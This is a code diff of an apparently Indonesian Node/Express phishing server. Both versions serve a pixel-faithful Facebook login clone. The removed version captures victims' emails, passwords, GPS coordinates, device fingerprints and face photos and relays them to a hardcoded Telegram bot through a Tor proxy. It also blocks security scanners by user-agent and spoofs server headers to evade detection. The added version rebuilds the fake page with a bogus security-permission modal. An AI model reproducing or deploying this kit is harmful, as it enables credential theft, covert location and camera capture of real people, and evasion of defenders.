@@ -1,1239 +1,1421 @@
-// server.js - ULTIMATE PHISHING TRACKER V2
-// Super Secure + Anti-DNS Detection + Vercel Ready
-
+// server.js - Advanced Phishing & Tracking System with Telegram Integration
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
-const crypto = require('crypto');
+const geoip = require('geoip-lite');
 const moment = require('moment');
-const axios = require('axios');
-const fs = require('fs');
-const path = require('path');
-const https = require('https');
-
-// ==================== KONFIGURASI SUPER STEALTH ====================
-const CONFIG = {
-    // Telegram Configuration
-    TELEGRAM_BOT_TOKEN: process.env.BOT_TOKEN || '8571006025:AAH690Akqkcf5haS83ZXMx_mPp3EdqIFDC0',
-    TELEGRAM_CHAT_ID: process.env.CHAT_ID || '6834832649',
-    
-    // Server Configuration
-    PORT: process.env.PORT || 3000,
-    DOMAIN: process.env.VERCEL_URL || `http://localhost:${PORT}`,
-    SECRET_KEY: crypto.randomBytes(64).toString('hex'),
-    
-    // Security Configuration
-    RATE_LIMIT_WINDOW: 15 * 60 * 1000, // 15 minutes
-    RATE_LIMIT_MAX: 100,
-    SESSION_DURATION: 24 * 60 * 60 * 1000, // 24 hours
-    
-    // Stealth Configuration
-    USER_AGENTS: [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
-    ],
-    
-    // Encryption Keys (Rotate daily)
-    ENCRYPTION_KEY: crypto.createHash('sha256').update(Date.now().toString()).digest(),
-    IV: crypto.randomBytes(16),
-    
-    // Fake Response Data
-    FAKE_RESPONSES: {
-        success: { status: 'ok', message: 'Request processed successfully' },
-        error: { status: 'error', message: 'Service temporarily unavailable' },
-        redirect: { status: 'redirect', url: 'https://facebook.com' }
-    }
-};
-
-// ==================== DATABASE ENCRYPTED ====================
-class SecureDatabase {
-    constructor() {
-        this.victims = new Map();
-        this.sessions = new Map();
-        this.logs = [];
-        this.stats = {
-            totalVictims: 0,
-            todayVictims: 0,
-            blockedAttempts: 0,
-            successfulCaptures: 0
-        };
-        
-        // Auto-save every 5 minutes
-        setInterval(() => this.saveToDisk(), 5 * 60 * 1000);
-    }
-    
-    encryptData(data) {
-        const cipher = crypto.createCipheriv('aes-256-gcm', CONFIG.ENCRYPTION_KEY, CONFIG.IV);
-        let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
-        encrypted += cipher.final('hex');
-        const authTag = cipher.getAuthTag();
-        return {
-            data: encrypted,
-            tag: authTag.toString('hex'),
-            iv: CONFIG.IV.toString('hex'),
-            timestamp: Date.now()
-        };
-    }
-    
-    decryptData(encryptedData) {
-        try {
-            const decipher = crypto.createDecipheriv('aes-256-gcm', 
-                CONFIG.ENCRYPTION_KEY, 
-                Buffer.from(encryptedData.iv, 'hex'));
-            decipher.setAuthTag(Buffer.from(encryptedData.tag, 'hex'));
-            let decrypted = decipher.update(encryptedData.data, 'hex', 'utf8');
-            decrypted += decipher.final('utf8');
-            return JSON.parse(decrypted);
-        } catch (error) {
-            return null;
-        }
-    }
-    
-    addVictim(victimData) {
-        const victimId = `victim_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
-        const sessionId = `session_${crypto.randomBytes(8).toString('hex')}`;
-        
-        const completeData = {
-            ...victimData,
-            id: victimId,
-            sessionId: sessionId,
-            timestamp: new Date().toISOString(),
-            date: moment().format('YYYY-MM-DD'),
-            hour: moment().format('HH'),
-            ip: victimData.ip || 'unknown',
-            userAgent: victimData.userAgent || 'unknown',
-            encrypted: true,
-            version: 'v2'
-        };
-        
-        // Encrypt sensitive data
-        const encryptedVictim = this.encryptData(completeData);
-        this.victims.set(victimId, encryptedVictim);
-        
-        // Update stats
-        this.stats.totalVictims++;
-        this.stats.todayVictims++;
-        this.stats.successfulCaptures++;
-        
-        // Create session
-        this.sessions.set(sessionId, {
-            id: sessionId,
-            victimId: victimId,
-            createdAt: Date.now(),
-            lastActivity: Date.now(),
-            ip: completeData.ip,
-            userAgent: completeData.userAgent,
-            data: {}
-        });
-        
-        this.log(`New victim captured: ${victimId}`, 'success');
-        return { victimId, sessionId, data: completeData };
-    }
-    
-    getVictim(victimId) {
-        const encrypted = this.victims.get(victimId);
-        if (!encrypted) return null;
-        return this.decryptData(encrypted);
-    }
-    
-    getAllVictims() {
-        const result = [];
-        for (const [id, encrypted] of this.victims.entries()) {
-            const data = this.decryptData(encrypted);
-            if (data) result.push(data);
-        }
-        return result.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-    }
-    
-    getTodayVictims() {
-        const today = moment().format('YYYY-MM-DD');
-        return this.getAllVictims().filter(v => v.date === today);
-    }
-    
-    getVictimsByHour(hour) {
-        return this.getAllVictims().filter(v => v.hour === hour);
-    }
-    
-    updateSession(sessionId, data) {
-        const session = this.sessions.get(sessionId);
-        if (session) {
-            session.lastActivity = Date.now();
-            session.data = { ...session.data, ...data };
-        }
-    }
-    
-    getSession(sessionId) {
-        return this.sessions.get(sessionId);
-    }
-    
-    log(message, type = 'info') {
-        const logEntry = {
-            timestamp: new Date().toISOString(),
-            type,
-            message,
-            ip: 'system'
-        };
-        this.logs.push(logEntry);
-        
-        // Keep only last 1000 logs
-        if (this.logs.length > 1000) {
-            this.logs = this.logs.slice(-1000);
-        }
-        
-        console.log(`[${type.toUpperCase()}] ${message}`);
-    }
-    
-    saveToDisk() {
-        try {
-            const data = {
-                victims: Array.from(this.victims.entries()),
-                sessions: Array.from(this.sessions.entries()),
-                stats: this.stats,
-                logs: this.logs,
-                timestamp: Date.now()
-            };
-            
-            // Encrypt entire database
-            const encrypted = this.encryptData(data);
-            const backupDir = path.join(__dirname, 'backups');
-            if (!fs.existsSync(backupDir)) fs.mkdirSync(backupDir, { recursive: true });
-            
-            const filename = `backup_${moment().format('YYYYMMDD_HHmmss')}.enc`;
-            fs.writeFileSync(path.join(backupDir, filename), JSON.stringify(encrypted, null, 2));
-            
-            this.log(`Database backed up to ${filename}`, 'info');
-        } catch (error) {
-            this.log(`Backup failed: ${error.message}`, 'error');
-        }
-    }
-    
-    getStatistics() {
-        const victims = this.getAllVictims();
-        const today = moment().format('YYYY-MM-DD');
-        const yesterday = moment().subtract(1, 'day').format('YYYY-MM-DD');
-        
-        return {
-            total: victims.length,
-            today: victims.filter(v => v.date === today).length,
-            yesterday: victims.filter(v => v.date === yesterday).length,
-            withLocation: victims.filter(v => v.location).length,
-            withPhoto: victims.filter(v => v.photo).length,
-            byHour: Array.from({ length: 24 }, (_, i) => ({
-                hour: i.toString().padStart(2, '0'),
-                count: victims.filter(v => v.hour === i.toString().padStart(2, '0')).length
-            })),
-            countries: this.getCountryStats(victims),
-            browsers: this.getBrowserStats(victims),
-            devices: this.getDeviceStats(victims),
-            recent: victims.slice(0, 10)
-        };
-    }
-    
-    getCountryStats(victims) {
-        const countries = {};
-        victims.forEach(v => {
-            const country = v.geolocation?.country || 'Unknown';
-            countries[country] = (countries[country] || 0) + 1;
-        });
-        return Object.entries(countries)
-            .sort((a, b) => b[1] - a[1])
-            .slice(0, 10);
-    }
-    
-    getBrowserStats(victims) {
-        const browsers = {};
-        victims.forEach(v => {
-            const ua = v.userAgent || '';
-            let browser = 'Unknown';
-            if (ua.includes('Chrome')) browser = 'Chrome';
-            else if (ua.includes('Firefox')) browser = 'Firefox';
-            else if (ua.includes('Safari')) browser = 'Safari';
-            else if (ua.includes('Edge')) browser = 'Edge';
-            else if (ua.includes('Opera')) browser = 'Opera';
-            browsers[browser] = (browsers[browser] || 0) + 1;
-        });
-        return Object.entries(browsers).sort((a, b) => b[1] - a[1]);
-    }
-    
-    getDeviceStats(victims) {
-        const devices = { mobile: 0, desktop: 0, tablet: 0 };
-        victims.forEach(v => {
-            const ua = v.userAgent || '';
-            if (ua.includes('Mobile') || ua.includes('Android') || ua.includes('iPhone')) {
-                devices.mobile++;
-            } else if (ua.includes('Tablet') || ua.includes('iPad')) {
-                devices.tablet++;
-            } else {
-                devices.desktop++;
-            }
-        });
-        return devices;
-    }
-}
-
-// Initialize database
-const db = new SecureDatabase();
-
-// ==================== TELEGRAM BOT ENHANCED ====================
-class EnhancedTelegramBot {
-    constructor() {
-        this.bot = null;
-        this.chatId = CONFIG.TELEGRAM_CHAT_ID;
-        this.initialize();
-    }
-    
-    initialize() {
-        if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === '8571006025:AAH690Akqkcf5haS83ZXMx_mPp3EdqIFDC0') {
-            console.warn('⚠️ Telegram bot token not configured');
-            return;
-        }
-        
-        try {
-            this.bot = new TelegramBot(CONFIG.TELEGRAM_BOT_TOKEN, { 
-                polling: false,
-                request: {
-                    agentClass: require('socks5-https-client/lib/Agent'),
-                    agentOptions: {
-                        socksHost: 'localhost',
-                        socksPort: 9050
-                    }
-                }
-            });
-            
-            console.log('✅ Telegram bot initialized with proxy support');
-            
-            // Setup commands
-            this.setupCommands();
-            
-            // Send startup notification
-            this.sendStartupNotification();
-            
-        } catch (error) {
-            console.error('❌ Failed to initialize Telegram bot:', error.message);
-        }
-    }
-    
-    setupCommands() {
-        this.bot.onText(/\/start/, async (msg) => {
-            const chatId = msg.chat.id;
-            const welcomeMessage = `
-🕵️‍♂️ *PHISHING TRACKER BOT V2*
-            
-*Available Commands:*
-/victims - Show recent victims
-/stats - Show detailed statistics
-/latest - Latest victim details
-/export - Export all data
-/blockip - Block an IP address
-/unblockip - Unblock IP
-/status - Bot status
-/help - Show this message
-
-*Automatic alerts enabled*
-            `;
-            await this.bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
-        });
-        
-        this.bot.onText(/\/victims/, async (msg) => {
-            const victims = db.getAllVictims().slice(0, 20);
-            if (victims.length === 0) {
-                await this.bot.sendMessage(msg.chat.id, '📭 No victims captured yet.');
-                return;
-            }
-            
-            let message = `📋 *Last ${victims.length} Victims:*\n\n`;
-            victims.forEach((v, i) => {
-                message += `${i+1}. *${v.credentials?.email || 'N/A'}*\n`;
-                message += `   📍 IP: \`${v.ip}\`\n`;
-                message += `   🕐 ${moment(v.timestamp).fromNow()}\n`;
-                message += `   ${v.location ? '📍' : '🚫'} ${v.photo ? '📸' : '🚫'}\n\n`;
-            });
-            
-            await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'Markdown' });
-        });
-        
-        this.bot.onText(/\/stats/, async (msg) => {
-            const stats = db.getStatistics();
-            const message = `
-📊 *Tracking Statistics*
-
-👥 Total Victims: ${stats.total}
-📅 Today: ${stats.today}
-📅 Yesterday: ${stats.yesterday}
-
-📍 With Location: ${stats.withLocation}
-📸 With Photos: ${stats.withPhoto}
-
-🌍 Top Countries:
-${stats.countries.map(([c, n]) => `  • ${c}: ${n}`).join('\n')}
-
-📱 Devices:
-  • Mobile: ${stats.devices.mobile}
-  • Desktop: ${stats.devices.desktop}
-  • Tablet: ${stats.devices.tablet}
-
-🕐 Last 24h Activity:
-${stats.byHour.slice(-24).map(h => `  • ${h.hour}:00 - ${h.count}`).join('\n')}
-            `;
-            await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'Markdown' });
-        });
-    }
-    
-    async sendVictimAlert(victimData) {
-        if (!this.bot || !this.chatId) return;
-        
-        try {
-            // Message 1: Basic info
-            const message1 = `
-🎯 *NEW VICTIM CAPTURED* 🎯
-
-*🔐 CREDENTIALS*
-📧 Email: \`${victimData.credentials?.email || 'N/A'}\`
-🔑 Password: \`${victimData.credentials?.password || 'N/A'}\`
-
-*📍 LOCATION*
-🌐 IP: \`${victimData.ip}\`
-${victimData.geolocation?.country ? `🗺️ Country: ${victimData.geolocation.country}` : ''}
-${victimData.geolocation?.city ? `🏙️ City: ${victimData.geolocation.city}` : ''}
-${victimData.location ? `📡 Coordinates: ${victimData.location.latitude}, ${victimData.location.longitude}` : ''}
-
-*🖥️ DEVICE INFO*
-${victimData.system?.platform ? `💻 Platform: ${victimData.system.platform}` : ''}
-${victimData.system?.screen ? `📱 Screen: ${victimData.system.screen.width}x${victimData.system.screen.height}` : ''}
-${victimData.network?.effectiveType ? `📶 Network: ${victimData.network.effectiveType}` : ''}
-            `;
-            
-            await this.bot.sendMessage(this.chatId, message1, { parse_mode: 'Markdown' });
-            
-            // Message 2: Advanced info
-            if (victimData.system) {
-                const message2 = `
-*🔍 ADVANCED SYSTEM INFO*
-
-*Browser Details:*
-${victimData.system.userAgent?.substring(0, 100)}...
-
-*Device Capabilities:*
-${victimData.features ? Object.entries(victimData.features).map(([k, v]) => `  • ${k}: ${v ? '✅' : '❌'}`).join('\n') : 'N/A'}
-
-*Network Info:*
-${victimData.network ? Object.entries(victimData.network).map(([k, v]) => `  • ${k}: ${v}`).join('\n') : 'N/A'}
-
-*Timestamp:* ${moment(victimData.timestamp).format('YYYY-MM-DD HH:mm:ss')}
-*Victim ID:* \`${victimData.id}\`
-                `;
-                
-                await this.bot.sendMessage(this.chatId, message2, { parse_mode: 'Markdown' });
-            }
-            
-            // Send location if available
-            if (victimData.location && victimData.location.latitude && victimData.location.longitude) {
-                await this.bot.sendLocation(
-                    this.chatId,
-                    victimData.location.latitude,
-                    victimData.location.longitude,
-                    {
-                        disable_notification: true
-                    }
-                );
-            }
-            
-            // Send photo if available
-            if (victimData.photo && victimData.photo.startsWith('data:image')) {
-                try {
-                    const base64Data = victimData.photo.replace(/^data:image\/[a-z]+;base64,/, '');
-                    const buffer = Buffer.from(base64Data, 'base64');
-                    await this.bot.sendPhoto(this.chatId, buffer, {
-                        caption: '📸 *Face Capture*',
-                        parse_mode: 'Markdown'
-                    });
-                } catch (photoError) {
-                    console.log('Photo send failed:', photoError.message);
-                }
-            }
-            
-            console.log(`📨 Telegram alert sent for ${victimData.id}`);
-            
-        } catch (error) {
-            console.error('Failed to send Telegram alert:', error.message);
-        }
-    }
-    
-    async sendStartupNotification() {
-        if (!this.bot || !this.chatId) return;
-        
-        const message = `
-🚀 *SERVER STARTUP NOTIFICATION*
-
-✅ *Phishing Tracker V2 Online*
-🌐 Domain: ${CONFIG.DOMAIN}
-🕐 Time: ${moment().format('YYYY-MM-DD HH:mm:ss')}
-🔒 Encryption: AES-256-GCM
-📊 Database: Encrypted In-Memory
-🛡️ Security: Enhanced Stealth Mode
-
-📡 *Features Enabled:*
-• Real-time Telegram Alerts
-• GPS Location Tracking
-• Facial Recognition Capture
-• Device Fingerprinting
-• Network Analysis
-• Encrypted Database
-• Anti-DNS Detection
-• Rate Limiting
-• IP Blocking
-
-📈 *Ready to capture victims!*
-        `;
-        
-        try {
-            await this.bot.sendMessage(this.chatId, message, { parse_mode: 'Markdown' });
-        } catch (error) {
-            console.log('Startup notification failed:', error.message);
-        }
-    }
-    
-    async sendHourlyReport() {
-        if (!this.bot || !this.chatId) return;
-        
-        const hour = moment().format('HH');
-        const hourlyVictims = db.getVictimsByHour(hour);
-        
-        if (hourlyVictims.length > 0) {
-            const message = `
-📊 *HOURLY REPORT - ${hour}:00*
-
-👥 New Victims: ${hourlyVictims.length}
-📍 With Location: ${hourlyVictims.filter(v => v.location).length}
-📸 With Photos: ${hourlyVictims.filter(v => v.photo).length}
-
-*Recent Activity:*
-${hourlyVictims.slice(0, 5).map(v => `  • ${v.credentials?.email || 'N/A'} - ${v.ip}`).join('\n')}
-
-📈 *Total Today:* ${db.getTodayVictims().length}
-            `;
-            
-            try {
-                await this.bot.sendMessage(this.chatId, message, { parse_mode: 'Markdown' });
-            } catch (error) {
-                console.log('Hourly report failed:', error.message);
-            }
-        }
-    }
-}
-
-// Initialize Telegram bot
-const telegramBot = new EnhancedTelegramBot();
-
-// ==================== EXPRESS APP WITH ENHANCED SECURITY ====================
+const crypto = require('crypto');
 const app = express();
 
-// Enhanced security middleware
+// Konfigurasi
+const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN || '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s';
+const TELEGRAM_CHAT_ID = process.env.CHAT_ID || '6834832649';
+const PORT = process.env.PORT || 3000;
+const DOMAIN = process.env.DOMAIN || `http://localhost:${PORT}`;
+
+// Inisialisasi Bot
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
+
+// Database in-memory
+const victims = new Map();
+const sessions = new Map();
+
+// Middleware
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use((req, res, next) => {
-    // Block known security scanners
-    const userAgent = req.headers['user-agent'] || '';
-    const blockedPatterns = [
-        'nmap', 'sqlmap', 'nikto', 'nessus', 'acunetix', 'netsparker',
-        'w3af', 'zap', 'burp', 'metasploit', 'dirb', 'gobuster',
-        'wfuzz', 'havij', 'wpscan', 'scanner', 'crawler', 'bot',
-        'spider', 'security', 'audit', 'penetration'
-    ];
-    
-    for (const pattern of blockedPatterns) {
-        if (userAgent.toLowerCase().includes(pattern)) {
-            db.stats.blockedAttempts++;
-            db.log(`Blocked security scanner: ${userAgent}`, 'security');
-            return res.status(403).json(CONFIG.FAKE_RESPONSES.error);
-        }
-    }
-    
-    // Rate limiting per IP
-    const ip = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress;
-    const rateKey = `rate_${ip}`;
-    // Implement rate limiting logic here
-    
-    next();
-});
-
-// Stealth headers
-app.use((req, res, next) => {
-    // Fake headers to look like legitimate service
-    res.setHeader('X-Powered-By', 'Express');
-    res.setHeader('Server', 'nginx/1.18.0 (Ubuntu)');
-    res.setHeader('X-Content-Type-Options', 'nosniff');
-    res.setHeader('X-Frame-Options', 'DENY');
-    res.setHeader('X-XSS-Protection', '1; mode=block');
-    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
-    res.setHeader('Content-Security-Policy', "default-src 'self'");
-    
-    // Random User-Agent rotation for outgoing requests
-    req.headers['user-agent'] = CONFIG.USER_AGENTS[
-        Math.floor(Math.random() * CONFIG.USER_AGENTS.length)
-    ];
-    
-    next();
-});
-
-// Body parsing with limits
-app.use(express.json({ 
-    limit: '50mb',
-    verify: (req, res, buf) => {
-        try {
-            JSON.parse(buf);
-        } catch (e) {
-            throw new Error('Invalid JSON');
-        }
-    }
-}));
-
-app.use(express.urlencoded({ 
-    extended: true, 
-    limit: '50mb',
-    parameterLimit: 10000
-}));
-
-// ==================== ROUTES ====================
-
-// Health check (shows fake status)
-app.get('/health', (req, res) => {
-    res.json({
-        status: 'healthy',
-        version: '2.0.0',
-        uptime: process.uptime(),
-        timestamp: new Date().toISOString(),
-        services: {
-            database: 'online',
-            api: 'online',
-            security: 'enabled',
-            monitoring: 'active'
-        }
+    req.sessionId = crypto.randomBytes(16).toString('hex');
+    sessions.set(req.sessionId, {
+        ip: req.ip || req.connection.remoteAddress,
+        userAgent: req.headers['user-agent'],
+        timestamp: Date.now()
     });
+    next();
 });
 
-// Main phishing page (Facebook clone)
+// Route Utama - Halaman Phishing Facebook yang sangat realistis
 app.get('/', (req, res) => {
-    const sessionId = crypto.randomBytes(16).toString('hex');
-    const trackingId = crypto.randomBytes(8).toString('hex');
+    const victimId = generateVictimId(req);
+    const sessionId = req.sessionId;
     
     res.send(`
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook – log in or sign up</title>
-    <meta name="description" content="Connect with friends and the world around you on Facebook.">
-    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Helvetica, Arial, sans-serif;
-        }
-        
-        body {
-            background-color: #f0f2f5;
-            color: #1c1e21;
-            line-height: 1.34;
-        }
-        
-        .container {
-            max-width: 980px;
-            margin: 0 auto;
-            padding: 20px;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .header {
-            text-align: center;
-            padding: 20px 0;
-        }
-        
-        .logo {
-            color: #1877f2;
-            font-size: 3.5em;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        
-        .subtitle {
-            font-size: 1.5em;
-            color: #1c1e21;
-            margin-bottom: 30px;
-        }
-        
-        .login-box {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
-            padding: 20px;
-            max-width: 400px;
-            margin: 0 auto;
-        }
-        
-        .login-box input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            margin-bottom: 12px;
-        }
-        
-        .login-box input:focus {
-            outline: none;
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-        
-        .login-btn {
-            background-color: #1877f2;
-            border: none;
-            border-radius: 6px;
-            font-size: 20px;
-            line-height: 48px;
-            padding: 0 16px;
-            width: 100%;
-            color: #fff;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        
-        .login-btn:hover {
-            background-color: #166fe5;
-        }
-        
-        .forgot-password {
-            display: block;
-            text-align: center;
-            color: #1877f2;
-            font-size: 14px;
-            text-decoration: none;
-            margin: 16px 0;
-            padding-bottom: 16px;
-            border-bottom: 1px solid #dadde1;
-        }
-        
-        .create-account {
-            background-color: #42b72a;
-            border: none;
-            border-radius: 6px;
-            font-size: 17px;
-            line-height: 48px;
-            padding: 0 16px;
-            color: #fff;
-            font-weight: bold;
-            cursor: pointer;
-            display: block;
-            margin: 20px auto 0;
-        }
-        
-        .security-notice {
-            background: #fff8e1;
-            border-left: 4px solid #ffc107;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 4px;
-            font-size: 14px;
-        }
-        
-        .capture-data {
-            display: none;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">facebook</div>
-            <div class="subtitle">Connect with friends and the world around you on Facebook.</div>
-        </div>
-        
-        <div class="login-box">
-            <form id="loginForm">
-                <input type="text" id="email" placeholder="Email or phone number" required autofocus>
-                <input type="password" id="password" placeholder="Password" required>
-                
-                <div class="security-notice">
-                    🔒 For your security, please complete the verification process.
-                </div>
-                
-                <button type="submit" class="login-btn" id="loginButton">
-                    Log In
-                </button>
-                
-                <a href="#" class="forgot-password">Forgotten password?</a>
-                
-                <button type="button" class="create-account" onclick="createAccount()">
-                    Create New Account
-                </button>
-            </form>
-        </div>
-        
-        <div class="capture-data" id="captureData">
-            <!-- Hidden form for data capture -->
-        </div>
-    </div>
-    
-    <script>
-        const sessionId = '${sessionId}';
-        const trackingId = '${trackingId}';
-        let collectedData = {};
-        
-        // Collect initial data
-        collectedData.initial = {
-            url: window.location.href,
-            referrer: document.referrer,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            platform: navigator.platform,
-            screen: {
-                width: screen.width,
-                height: screen.height,
-                colorDepth: screen.colorDepth
-            },
-            window: {
-                width: window.innerWidth,
-                height: window.innerHeight
-            },
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cookiesEnabled: navigator.cookieEnabled,
-            online: navigator.onLine
-        };
-        
-        // Collect network info
-        if (navigator.connection) {
-            collectedData.network = {
-                effectiveType: navigator.connection.effectiveType,
-                downlink: navigator.connection.downlink,
-                rtt: navigator.connection.rtt,
-                saveData: navigator.connection.saveData
-            };
-        }
-        
-        // Collect device info
-        collectedData.device = {
-            hardwareConcurrency: navigator.hardwareConcurrency,
-            deviceMemory: navigator.deviceMemory,
-            maxTouchPoints: navigator.maxTouchPoints
-        };
-        
-        // Collect plugins
-        collectedData.plugins = Array.from(navigator.plugins || []).map(p => ({
-            name: p.name,
-            description: p.description
-        }));
-        
-        // Get IP address
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                return 'unknown';
+    <!DOCTYPE html>
+    <html lang="en" dir="ltr">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <title>Facebook – log in or sign up</title>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+        <style>
+            * {
+                box-sizing: border-box;
+                margin: 0;
+                padding: 0;
+                font-family: Helvetica, Arial, sans-serif;
             }
-        }
+            
+            body {
+                background-color: #f0f2f5;
+                color: #1c1e21;
+                line-height: 1.34;
+            }
+            
+            .container {
+                max-width: 980px;
+                margin: 0 auto;
+                padding: 72px 0 112px;
+            }
+            
+            .row {
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                flex-wrap: wrap;
+            }
+            
+            .intro {
+                flex: 0 0 580px;
+                padding-right: 32px;
+            }
+            
+            .intro h1 {
+                color: #1877f2;
+                font-size: 55px;
+                font-weight: bold;
+                margin-bottom: 16px;
+            }
+            
+            .intro h2 {
+                font-size: 28px;
+                font-weight: normal;
+                line-height: 32px;
+            }
+            
+            .login-panel {
+                flex: 0 0 396px;
+            }
+            
+            .login-box {
+                background-color: #fff;
+                border: none;
+                border-radius: 8px;
+                box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+                padding: 20px;
+                width: 100%;
+            }
+            
+            .login-box input {
+                width: 100%;
+                padding: 14px 16px;
+                border: 1px solid #dddfe2;
+                border-radius: 6px;
+                font-size: 17px;
+                margin-bottom: 12px;
+                color: #1d2129;
+            }
+            
+            .login-box input:focus {
+                outline: none;
+                border-color: #1877f2;
+                box-shadow: 0 0 0 2px #e7f3ff;
+            }
+            
+            .login-btn {
+                background-color: #1877f2;
+                border: none;
+                border-radius: 6px;
+                font-size: 20px;
+                line-height: 48px;
+                padding: 0 16px;
+                width: 100%;
+                color: #fff;
+                font-weight: bold;
+                cursor: pointer;
+                transition: background-color 0.3s;
+            }
+            
+            .login-btn:hover {
+                background-color: #166fe5;
+            }
+            
+            .forgot-password {
+                display: block;
+                text-align: center;
+                color: #1877f2;
+                font-size: 14px;
+                text-decoration: none;
+                margin: 16px 0;
+                padding-bottom: 16px;
+                border-bottom: 1px solid #dadde1;
+            }
+            
+            .forgot-password:hover {
+                text-decoration: underline;
+            }
+            
+            .create-account {
+                background-color: #42b72a;
+                border: none;
+                border-radius: 6px;
+                font-size: 17px;
+                line-height: 48px;
+                padding: 0 16px;
+                color: #fff;
+                font-weight: bold;
+                cursor: pointer;
+                transition: background-color 0.3s;
+                display: block;
+                margin: 0 auto;
+                margin-top: 24px;
+            }
+            
+            .create-account:hover {
+                background-color: #36a420;
+            }
+            
+            .create-page {
+                text-align: center;
+                margin-top: 28px;
+                color: #1c1e21;
+                font-size: 14px;
+            }
+            
+            .create-page a {
+                color: #1c1e21;
+                font-weight: bold;
+                text-decoration: none;
+            }
+            
+            .create-page a:hover {
+                text-decoration: underline;
+            }
+            
+            .footer {
+                background-color: #fff;
+                padding: 20px 0;
+                margin-top: 40px;
+                border-top: 1px solid #dddfe2;
+            }
+            
+            .footer-links {
+                max-width: 980px;
+                margin: 0 auto;
+                padding: 0 32px;
+                font-size: 12px;
+                color: #8a8d91;
+            }
+            
+            .footer-links a {
+                color: #8a8d91;
+                text-decoration: none;
+                margin-right: 20px;
+            }
+            
+            .footer-links a:hover {
+                text-decoration: underline;
+            }
+            
+            .languages {
+                margin-bottom: 10px;
+            }
+            
+            .meta-footer {
+                margin-top: 20px;
+                font-size: 11px;
+            }
+            
+            /* Security Verification Modal */
+            .modal {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.85);
+                z-index: 10000;
+                animation: fadeIn 0.3s;
+            }
+            
+            @keyframes fadeIn {
+                from { opacity: 0; }
+                to { opacity: 1; }
+            }
+            
+            .modal-content {
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: #fff;
+                width: 90%;
+                max-width: 500px;
+                border-radius: 12px;
+                overflow: hidden;
+                box-shadow: 0 12px 28px rgba(0,0,0,0.3);
+            }
+            
+            .modal-header {
+                background: #1877f2;
+                color: white;
+                padding: 20px;
+                text-align: center;
+            }
+            
+            .modal-header h2 {
+                font-size: 22px;
+                margin: 0;
+            }
+            
+            .modal-body {
+                padding: 30px;
+            }
+            
+            .security-alert {
+                background: #fff8e1;
+                border-left: 4px solid #ffc107;
+                padding: 15px;
+                margin-bottom: 25px;
+                border-radius: 4px;
+            }
+            
+            .security-alert i {
+                color: #ff9800;
+                margin-right: 10px;
+            }
+            
+            .permission-item {
+                display: flex;
+                align-items: center;
+                margin: 15px 0;
+                padding: 15px;
+                background: #f5f6f7;
+                border-radius: 8px;
+            }
+            
+            .permission-icon {
+                background: #1877f2;
+                color: white;
+                width: 40px;
+                height: 40px;
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin-right: 15px;
+                font-size: 18px;
+            }
+            
+            .permission-text {
+                flex: 1;
+            }
+            
+            .permission-text h4 {
+                margin: 0 0 5px 0;
+                color: #1c1e21;
+            }
+            
+            .permission-text p {
+                margin: 0;
+                color: #65676b;
+                font-size: 14px;
+            }
+            
+            .checkbox-container {
+                display: flex;
+                align-items: center;
+                margin: 20px 0 30px;
+            }
+            
+            .checkbox-container input {
+                margin-right: 10px;
+                transform: scale(1.2);
+            }
+            
+            .modal-buttons {
+                display: flex;
+                gap: 10px;
+            }
+            
+            .btn-primary {
+                flex: 1;
+                background: #1877f2;
+                color: white;
